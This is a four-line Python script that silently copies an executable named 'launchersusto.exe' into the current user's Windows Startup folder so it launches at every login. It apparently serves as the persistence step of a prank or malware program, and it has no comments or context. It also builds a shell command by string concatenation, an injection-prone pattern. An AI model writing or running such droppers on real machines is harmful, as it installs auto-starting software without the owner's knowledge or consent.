import os,getpass
currdir=os.path.dirname(os.path.abspath(__file__))
usuario=getpass.getuser()
os.system("copy "+currdir+"\\launchersusto.exe C:\\Users\\"+usuario+"\\Appdata\\Roaming\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\launchersusto.exe")